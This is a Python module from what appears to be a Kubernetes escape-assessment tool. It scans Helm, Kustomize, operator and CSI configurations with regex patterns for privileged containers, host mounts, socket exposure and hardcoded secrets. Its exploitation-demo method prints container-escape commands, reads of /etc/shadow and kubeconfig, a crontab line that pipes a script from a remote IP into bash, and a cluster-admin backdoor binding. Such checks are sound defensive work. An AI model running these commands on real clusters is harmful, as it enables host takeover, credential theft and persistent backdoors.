"""
Package Management Security Checker

Checks for security vulnerabilities in Kubernetes package management:
- Helm chart vulnerabilities
- Helm secrets security
- Kustomize secret injection
- Kustomize patches security
- Operator security

MITRE ATT&CK: T1195.002 (Supply Chain Compromise), T1098 (Account Manipulation)
"""

import os
import json
import re
import base64
import asyncio
from typing import Any, Dict, List, Optional
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec_stdout


# =============================================================================
# Helm Security Patterns
# =============================================================================

HELM_SECURITY_CHECKS = {
    "helm_chart_vulnerabilities": {
        "patterns": {
            # Privileged containers in charts
            "privileged_container": {
                "pattern": r"privileged:\s*true|securityContext:.*privileged:\s*true",
                "risk": "critical",
                "description": "Helm chart creates privileged containers",
            },
            # Host namespace access
            "host_network": {
                "pattern": r"hostNetwork:\s*true",
                "risk": "high",
                "description": "Helm chart enables host network access",
            },
            "host_pid": {
                "pattern": r"hostPID:\s*true",
                "risk": "high",
                "description": "Helm chart enables host PID namespace",
            },
            "host_ipc": {
                "pattern": r"hostIPC:\s*true",
                "risk": "high",
                "description": "Helm chart enables host IPC namespace",
            },
            # Host path volumes
            "hostpath_volume": {
                "pattern": r"hostPath:\s*\n\s*path:\s*/",
                "risk": "critical",
                "description": "Helm chart mounts host filesystem paths",
            },
            # Dangerous capabilities
            "sys_admin_cap": {
                "pattern": r"SYS_ADMIN|CAP_SYS_ADMIN",
                "risk": "critical",
                "description": "Helm chart adds SYS_ADMIN capability",
            },
            "net_admin_cap": {
                "pattern": r"NET_ADMIN|CAP_NET_ADMIN",
                "risk": "high",
                "description": "Helm chart adds NET_ADMIN capability",
            },
            # Container socket mounts
            "docker_socket": {
                "pattern": r"/var/run/docker\.sock|docker\.sock",
                "risk": "critical",
                "description": "Helm chart mounts Docker socket",
            },
            "containerd_socket": {
                "pattern": r"/run/containerd/containerd\.sock",
                "risk": "critical",
                "description": "Helm chart mounts containerd socket",
            },
            # Kubernetes API access
            "cluster_admin": {
                "pattern": r"cluster-admin|ClusterRoleBinding.*cluster-admin",
                "risk": "critical",
                "description": "Helm chart grants cluster-admin privileges",
            },
            # Run as root
            "run_as_root": {
                "pattern": r"runAsUser:\s*0|runAsNonRoot:\s*false",
                "risk": "medium",
                "description": "Helm chart runs containers as root",
            },
        },
    },
    "helm_secrets_security": {
        "patterns": {
            # Hardcoded secrets in values
            "hardcoded_password": {
                "pattern": r"password:\s*['\"]?[^'\"\n]{8,}['\"]?|passwd:\s*['\"]?[^'\"\n]{8,}['\"]?",
                "risk": "high",
                "description": "Hardcoded password in Helm values",
            },
            "hardcoded_api_key": {
                "pattern": r"apiKey:\s*['\"]?[A-Za-z0-9_-]{20,}['\"]?|api_key:\s*['\"]?[A-Za-z0-9_-]{20,}['\"]?",
                "risk": "high",
                "description": "Hardcoded API key in Helm values",
            },
            "hardcoded_token": {
                "pattern": r"token:\s*['\"]?[A-Za-z0-9_.-]{20,}['\"]?|secret:\s*['\"]?[A-Za-z0-9_.-]{20,}['\"]?",
                "risk": "high",
                "description": "Hardcoded token/secret in Helm values",
            },
            # Base64 encoded secrets (potential exposure)
            "base64_secret": {
                "pattern": r"[A-Za-z0-9+/]{40,}={0,2}",
                "risk": "medium",
                "description": "Potential base64 encoded secret in Helm values",
            },
            # AWS credentials
            "aws_access_key": {
                "pattern": r"AKIA[0-9A-Z]{16}",
                "risk": "critical",
                "description": "AWS access key in Helm values",
            },
            "aws_secret_key": {
                "pattern": r"aws_secret_access_key|AWS_SECRET_ACCESS_KEY",
                "risk": "high",
                "description": "AWS secret key reference in Helm values",
            },
            # Database credentials
            "database_url": {
                "pattern": r"postgresql://|mysql://|mongodb://|redis://",
                "risk": "high",
                "description": "Database connection string in Helm values",
            },
            # Private keys
            "private_key": {
                "pattern": r"-----BEGIN.*PRIVATE KEY-----",
                "risk": "critical",
                "description": "Private key embedded in Helm values",
            },
        },
    },
    "helm_hooks_abuse": {
        "patterns": {
            # Pre-install hooks that could be malicious
            "pre_install_hook": {
                "pattern": r"helm\.sh/hook:\s*pre-install",
                "risk": "medium",
                "description": "Pre-install hook detected - verify it doesn't execute malicious code",
            },
            # Post-install hooks
            "post_install_hook": {
                "pattern": r"helm\.sh/hook:\s*post-install",
                "risk": "medium",
                "description": "Post-install hook detected",
            },
            # Delete hooks
            "pre_delete_hook": {
                "pattern": r"helm\.sh/hook:\s*pre-delete",
                "risk": "low",
                "description": "Pre-delete hook detected",
            },
        },
    },
}


# =============================================================================
# Kustomize Security Patterns
# =============================================================================

KUSTOMIZE_SECURITY_CHECKS = {
    "kustomize_secret_injection": {
        "patterns": {
            # Secrets from literals
            "secret_from_literal": {
                "pattern": r"secretGenerator:.*literals:",
                "risk": "high",
                "description": "Kustomize generates secrets from literals (plaintext)",
            },
            # Secrets from files
            "secret_from_file": {
                "pattern": r"secretGenerator:.*files:",
                "risk": "medium",
                "description": "Kustomize generates secrets from files",
            },
            # ConfigMap with sensitive data
            "configmap_secrets": {
                "pattern": r"configMapGenerator:.*password|configMapGenerator:.*token|configMapGenerator:.*secret",
                "risk": "high",
                "description": "ConfigMap may contain sensitive data",
            },
        },
    },
    "kustomize_patches_security": {
        "patterns": {
            # Strategic merge patches that modify security context
            "security_context_patch": {
                "pattern": r"patchesStrategicMerge:.*securityContext",
                "risk": "high",
                "description": "Kustomize patch modifies securityContext",
            },
            # JSON patches that could be malicious
            "json_patch": {
                "pattern": r"patchesJson6902:",
                "risk": "medium",
                "description": "JSON patch detected - verify it doesn't weaken security",
            },
            # Namespace override
            "namespace_override": {
                "pattern": r"namespace:\s*kube-system|namespace:\s*kube-public",
                "risk": "high",
                "description": "Kustomize deploys to system namespace",
            },
        },
    },
    "kustomize_remote_resources": {
        "patterns": {
            # Remote base that could be compromised
            "remote_base": {
                "pattern": r"resources:.*github\.com|resources:.*gitlab\.com|resources:.*bitbucket\.org",
                "risk": "high",
                "description": "Kustomize uses remote base - verify source integrity",
            },
            # Remote without version pinning
            "remote_unpinned": {
                "pattern": r"github\.com/[^?@]+(?!\?ref=|@)",
                "risk": "high",
                "description": "Remote resource without version pinning",
            },
        },
    },
}


# =============================================================================
# Operator Security Patterns
# =============================================================================

OPERATOR_SECURITY_CHECKS = {
    "operator_rbac": {
        "patterns": {
            # Overly permissive ClusterRole
            "wildcard_resources": {
                "pattern": r"resources:\s*\[\s*['\"]?\*['\"]?\s*\]|resources:.*-\s*['\"]?\*['\"]?",
                "risk": "critical",
                "description": "Operator has wildcard resource access",
            },
            "wildcard_verbs": {
                "pattern": r"verbs:\s*\[\s*['\"]?\*['\"]?\s*\]|verbs:.*-\s*['\"]?\*['\"]?",
                "risk": "critical",
                "description": "Operator has wildcard verb permissions",
            },
            "secrets_access": {
                "pattern": r"resources:.*secrets.*verbs:.*(get|list|watch|\*)",
                "risk": "high",
                "description": "Operator can access secrets",
            },
        },
    },
    "operator_deployment": {
        "patterns": {
            # Privileged operator
            "privileged_operator": {
                "pattern": r"privileged:\s*true.*operator|operator.*privileged:\s*true",
                "risk": "critical",
                "description": "Operator runs as privileged",
            },
            # Host access
            "operator_hostpath": {
                "pattern": r"hostPath:.*operator|operator.*hostPath:",
                "risk": "high",
                "description": "Operator mounts host paths",
            },
        },
    },
}


# =============================================================================
# CSI Driver Extended Checks
# =============================================================================

CSI_EXTENDED_CHECKS = {
    "csi_driver_security": {
        "patterns": {
            # CSI driver with privileged mode
            "privileged_csi": {
                "pattern": r"csi-.*privileged:\s*true|csiDriver.*privileged",
                "risk": "critical",
                "description": "CSI driver runs in privileged mode",
            },
            # CSI socket exposure
            "csi_socket_mount": {
                "pattern": r"/var/lib/kubelet/plugins/.*csi\.sock|/csi/csi\.sock",
                "risk": "high",
                "description": "CSI socket potentially accessible",
            },
            # CSI with host path provisioner
            "hostpath_provisioner": {
                "pattern": r"hostpath\.csi|local-path-provisioner|rancher/local-path-provisioner",
                "risk": "high",
                "description": "Host path CSI provisioner detected",
            },
        },
    },
    "volume_abuse": {
        "patterns": {
            # Persistent volume with host path
            "pv_hostpath": {
                "pattern": r"PersistentVolume.*hostPath:|hostPath.*PersistentVolume",
                "risk": "high",
                "description": "PersistentVolume uses host path",
            },
            # StorageClass with unsafe provisioner
            "unsafe_provisioner": {
                "pattern": r"provisioner:\s*kubernetes\.io/no-provisioner",
                "risk": "medium",
                "description": "StorageClass uses no-provisioner (manual binding)",
            },
            # Volume snapshot abuse
            "snapshot_abuse": {
                "pattern": r"VolumeSnapshot.*dataSource|dataSource.*VolumeSnapshot",
                "risk": "medium",
                "description": "Volume created from snapshot - verify source",
            },
        },
    },
}


class PackageManagementChecker:
    """Checks package management security in Kubernetes"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
        self.findings: List[Dict[str, Any]] = []
    
    async def check(self) -> EscapeAttemptResult:
        """
        Check for package management security issues.
        
        Returns:
            EscapeAttemptResult with findings
        """
        try:
            all_findings = []
            
            # Check installed Helm releases
            helm_findings = await self._check_helm_releases()
            all_findings.extend(helm_findings)
            
            # Check Kustomize resources
            kustomize_findings = await asyncio.to_thread(self._check_kustomize_resources)
            all_findings.extend(kustomize_findings)
            
            # Check operators
            operator_findings = await self._check_operators()
            all_findings.extend(operator_findings)
            
            # Check CSI drivers (extended)
            csi_findings = await self._check_csi_drivers_extended()
            all_findings.extend(csi_findings)
            
            self.findings = all_findings
            
            critical_findings = [f for f in all_findings if f.get("risk") == "critical"]
            high_findings = [f for f in all_findings if f.get("risk") == "high"]
            
            if critical_findings:
                demo_next = self._generate_exploitation_demo(critical_findings)
                return EscapeAttemptResult(
                    method='package_management',
                    status='exploited',
                    message=f'Found {len(critical_findings)} critical and {len(high_findings)} high risk package management issues',
                    demo_next_steps=demo_next
                )
            elif high_findings:
                return EscapeAttemptResult(
                    method='package_management',
                    status='suspicious',
                    message=f'Found {len(high_findings)} high risk package management issues'
                )
            elif all_findings:
                return EscapeAttemptResult(
                    method='package_management',
                    status='info',
                    message=f'Found {len(all_findings)} package management findings'
                )
            else:
                return EscapeAttemptResult(
                    method='package_management',
                    status='not_vulnerable',
                    message='No package management security issues detected'
                )
        except Exception as e:
            return EscapeAttemptResult(
                method='package_management',
                status='error',
                message=str(e)
            )
    
    async def _check_helm_releases(self) -> List[Dict[str, Any]]:
        """Check installed Helm releases for security issues."""
        findings = []
        
        try:
            # Check if helm is available
            helm_path = await run_exec_stdout(['which', 'helm'], timeout=5)
            if not helm_path:
                # Try kubectl to get helm releases via secrets
                return await self._check_helm_via_kubectl()
            
            # List helm releases
            out = await run_exec_stdout(['helm', 'list', '-A', '-o', 'json'], timeout=30)
            if out:
                releases = json.loads(out) if out else []
                
                for release in releases:
                    release_name = release.get('name', 'unknown')
                    namespace = release.get('namespace', 'default')
                    
                    # Get release values
                    values_content = await run_exec_stdout(
                        ['helm', 'get', 'values', release_name, '-n', namespace, '-o', 'yaml'],
                        timeout=10,
                    )
                    if values_content:
                        
                        # Check for security issues in values
                        for check_name, check_config in HELM_SECURITY_CHECKS.items():
                            for pattern_name, pattern_config in check_config.get("patterns", {}).items():
                                if re.search(pattern_config["pattern"], values_content, re.I | re.M):
                                    findings.append({
                                        "type": "helm",
                                        "check": check_name,
                                        "finding": pattern_name,
                                        "release": release_name,
                                        "namespace": namespace,
                                        "risk": pattern_config["risk"],
                                        "description": pattern_config["description"],
                                    })
                    
                    # Get release manifest
                    manifest_content = await run_exec_stdout(
                        ['helm', 'get', 'manifest', release_name, '-n', namespace],
                        timeout=10,
                    )
                    if manifest_content:
                        
                        # Check manifest for security issues
                        for check_name, check_config in HELM_SECURITY_CHECKS.items():
                            for pattern_name, pattern_config in check_config.get("patterns", {}).items():
                                if re.search(pattern_config["pattern"], manifest_content, re.I | re.M):
                                    # Avoid duplicates
                                    existing = any(
                                        f["release"] == release_name and f["finding"] == pattern_name
                                        for f in findings
                                    )
                                    if not existing:
                                        findings.append({
                                            "type": "helm_manifest",
                                            "check": check_name,
                                            "finding": pattern_name,
                                            "release": release_name,
                                            "namespace": namespace,
                                            "risk": pattern_config["risk"],
                                            "description": pattern_config["description"],
                                        })
        except Exception:
            pass
        
        return findings
    
    async def _check_helm_via_kubectl(self) -> List[Dict[str, Any]]:
        """Check Helm releases via kubectl when helm CLI is not available."""
        findings = []
        
        try:
            # Helm stores releases as secrets
            out = await run_exec_stdout(['kubectl', 'get', 'secrets', '-A', '-l', 'owner=helm', '-o', 'json'], timeout=30)
            if out:
                secrets = json.loads(out) if out else {"items": []}
                
                for secret in secrets.get("items", []):
                    name = secret.get("metadata", {}).get("name", "")
                    namespace = secret.get("metadata", {}).get("namespace", "")
                    
                    # Extract release name from secret name (format: sh.helm.release.v1.NAME.vN)
                    if name.startswith("sh.helm.release.v1."):
                        release_name = name.split(".")[4] if len(name.split(".")) > 4 else name
                        
                        findings.append({
                            "type": "helm_release_detected",
                            "release": release_name,
                            "namespace": namespace,
                            "risk": "info",
                            "description": f"Helm release detected: {release_name}",
                        })
        except Exception:
            pass
        
        return findings
    
    def _check_kustomize_resources(self) -> List[Dict[str, Any]]:
        """Check for Kustomize-related security issues."""
        findings = []
        
        try:
            # Look for kustomization files
            kustomize_files = []
            search_paths = ['/app', '/workload', '.', os.getcwd()]
            
            for path in search_paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for f in files:
                            if f in ['kustomization.yaml', 'kustomization.yml', 'Kustomization']:
                                kustomize_files.append(os.path.join(root, f))
                        # Limit depth
                        if root.count(os.sep) > 3:
                            break
            
            for kf in kustomize_files:
                try:
                    with open(kf, 'r') as f:
                        content = f.read()
                    
                    for check_name, check_config in KUSTOMIZE_SECURITY_CHECKS.items():
                        for pattern_name, pattern_config in check_config.get("patterns", {}).items():
                            if re.search(pattern_config["pattern"], content, re.I | re.M):
                                findings.append({
                                    "type": "kustomize",
                                    "check": check_name,
                                    "finding": pattern_name,
                                    "file": kf,
                                    "risk": pattern_config["risk"],
                                    "description": pattern_config["description"],
                                })
                except Exception:
                    pass
        except Exception:
            pass
        
        return findings
    
    async def _check_operators(self) -> List[Dict[str, Any]]:
        """Check for operator-related security issues."""
        findings = []
        
        try:
            # Get operators (look for pods with operator in name)
            out = await run_exec_stdout(['kubectl', 'get', 'pods', '-A', '-o', 'json'], timeout=30)
            if out:
                pods = json.loads(out) if out else {"items": []}
                
                for pod in pods.get("items", []):
                    pod_name = pod.get("metadata", {}).get("name", "")
                    namespace = pod.get("metadata", {}).get("namespace", "")
                    
                    if "operator" in pod_name.lower():
                        # Check pod spec for security issues
                        spec = pod.get("spec", {})
                        
                        for container in spec.get("containers", []):
                            sec_context = container.get("securityContext", {})
                            
                            if sec_context.get("privileged"):
                                findings.append({
                                    "type": "operator",
                                    "finding": "privileged_operator",
                                    "pod": pod_name,
                                    "namespace": namespace,
                                    "risk": "critical",
                                    "description": f"Operator {pod_name} runs as privileged",
                                })
                            
                            # Check for host mounts
                            for vol in spec.get("volumes", []):
                                if vol.get("hostPath"):
                                    findings.append({
                                        "type": "operator",
                                        "finding": "operator_hostpath",
                                        "pod": pod_name,
                                        "namespace": namespace,
                                        "risk": "high",
                                        "description": f"Operator {pod_name} mounts host path",
                                    })
                                    break
                        
                        # Check service account RBAC
                        sa_name = spec.get("serviceAccountName", "default")
                        rbac_findings = await self._check_sa_rbac(sa_name, namespace)
                        findings.extend(rbac_findings)
        except Exception:
            pass
        
        return findings
    
    async def _check_sa_rbac(self, sa_name: str, namespace: str) -> List[Dict[str, Any]]:
        """Check service account RBAC permissions."""
        findings = []
        
        try:
            # Get role bindings for service account
            out = await run_exec_stdout(['kubectl', 'get', 'clusterrolebindings,rolebindings', '-A', '-o', 'json'], timeout=30)
            if out:
                bindings = json.loads(out) if out else {"items": []}
                
                for binding in bindings.get("items", []):
                    subjects = binding.get("subjects", [])
                    
                    for subject in subjects:
                        if (subject.get("kind") == "ServiceAccount" and 
                            subject.get("name") == sa_name and
                            (subject.get("namespace") == namespace or binding.get("kind") == "ClusterRoleBinding")):
                            
                            role_ref = binding.get("roleRef", {})
                            role_name = role_ref.get("name", "")
                            
                            if role_name == "cluster-admin":
                                findings.append({
                                    "type": "operator_rbac",
                                    "finding": "cluster_admin_sa",
                                    "service_account": f"{namespace}/{sa_name}",
                                    "risk": "critical",
                                    "description": f"Service account {sa_name} has cluster-admin role",
                                })
        except Exception:
            pass
        
        return findings
    
    async def _check_csi_drivers_extended(self) -> List[Dict[str, Any]]:
        """Extended CSI driver security checks."""
        findings = []
        
        try:
            # Get CSI drivers
            out = await run_exec_stdout(['kubectl', 'get', 'csidrivers', '-o', 'json'], timeout=30)
            if out:
                drivers = json.loads(out) if out else {"items": []}
                
                for driver in drivers.get("items", []):
                    driver_name = driver.get("metadata", {}).get("name", "")
                    
                    # Check for dangerous CSI drivers
                    if any(d in driver_name.lower() for d in ["hostpath", "local-path", "rancher"]):
                        findings.append({
                            "type": "csi_driver",
                            "finding": "hostpath_provisioner",
                            "driver": driver_name,
                            "risk": "high",
                            "description": f"Host path CSI driver detected: {driver_name}",
                        })
            
            # Get storage classes
            sc_out = await run_exec_stdout(['kubectl', 'get', 'storageclasses', '-o', 'json'], timeout=30)
            if sc_out:
                scs = json.loads(sc_out) if sc_out else {"items": []}
                
                for sc in scs.get("items", []):
                    sc_name = sc.get("metadata", {}).get("name", "")
                    provisioner = sc.get("provisioner", "")
                    
                    if "no-provisioner" in provisioner or "hostpath" in provisioner.lower():
                        findings.append({
                            "type": "storage_class",
                            "finding": "unsafe_provisioner",
                            "storage_class": sc_name,
                            "provisioner": provisioner,
                            "risk": "medium",
                            "description": f"StorageClass {sc_name} uses potentially unsafe provisioner",
                        })
        except Exception:
            pass
        
        return findings
    
    def _generate_exploitation_demo(self, critical_findings: List[Dict[str, Any]]) -> str:
        """Generate exploitation demonstration steps."""
        steps = []
        
        for finding in critical_findings[:3]:  # Top 3 critical findings
            finding_type = finding.get("type", "")
            finding_name = finding.get("finding", "")
            
            if "privileged" in finding_name:
                steps.append(f"""
1. Exploit privileged container in {finding.get('release', finding.get('pod', 'resource'))}:
   ```bash
   # Access host filesystem
   nsenter -t 1 -m -u -i -n -p -- /bin/bash
   
   # Or mount host root
   mount /dev/sda1 /mnt
   chroot /mnt
   ```
""")
            elif "hostpath" in finding_name.lower():
                steps.append(f"""
2. Exploit host path mount:
   ```bash
   # Read host files
   cat /host/etc/shadow
   cat /host/root/.kube/config
   
   # Write malicious cron
   echo '* * * * * root curl http://198.51.100.10/shell.sh | bash' >> /host/etc/crontab
   ```
""")
            elif "cluster-admin" in finding_name or "cluster_admin" in finding_name:
                steps.append(f"""
3. Abuse cluster-admin privileges:
   ```bash
   # Create privileged pod
   kubectl run pwned --image=alpine --privileged=true --command -- sleep infinity
   
   # Access secrets
   kubectl get secrets -A -o yaml
   
   # Create backdoor
   kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin --user=attacker@example.com
   ```
""")
            elif "docker_socket" in finding_name or "containerd_socket" in finding_name:
                steps.append(f"""
4. Escape via container socket:
   ```bash
   # Docker socket escape
   docker run -v /:/host --privileged alpine chroot /host
   
   # Or containerd escape
   ctr run -t --rm --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw alpine:latest pwned
   ```
""")
        
        if steps:
            return "Detected critical package management security issues. Exploitation paths:\n" + "\n".join(steps)
        return "Critical security issues detected in package management configuration."
    
    def scan_file(self, file_path: str, content: str) -> List[Dict[str, Any]]:
        """
        Scan a file for package management security issues.
        
        Args:
            file_path: Path to file
            content: File content
            
        Returns:
            List of findings
        """
        findings = []
        
        # Determine file type
        file_lower = file_path.lower()
        
        if 'helm' in file_lower or file_lower.endswith('.tpl') or 'chart' in file_lower:
            checks = HELM_SECURITY_CHECKS
            finding_type = "helm"
        elif 'kustomiz' in file_lower:
            checks = KUSTOMIZE_SECURITY_CHECKS
            finding_type = "kustomize"
        elif 'operator' in file_lower:
            checks = OPERATOR_SECURITY_CHECKS
            finding_type = "operator"
        else:
            # Check all patterns
            checks = {
                **HELM_SECURITY_CHECKS,
                **KUSTOMIZE_SECURITY_CHECKS,
                **OPERATOR_SECURITY_CHECKS,
                **CSI_EXTENDED_CHECKS,
            }
            finding_type = "kubernetes"
        
        for check_name, check_config in checks.items():
            for pattern_name, pattern_config in check_config.get("patterns", {}).items():
                matches = re.finditer(pattern_config["pattern"], content, re.I | re.M)
                for match in matches:
                    line_num = content[:match.start()].count('\n') + 1
                    findings.append({
                        "type": finding_type,
                        "check": check_name,
                        "finding": pattern_name,
                        "file": file_path,
                        "line": line_num,
                        "risk": pattern_config["risk"],
                        "description": pattern_config["description"],
                        "evidence": match.group(0)[:100],
                    })
        
        return findings

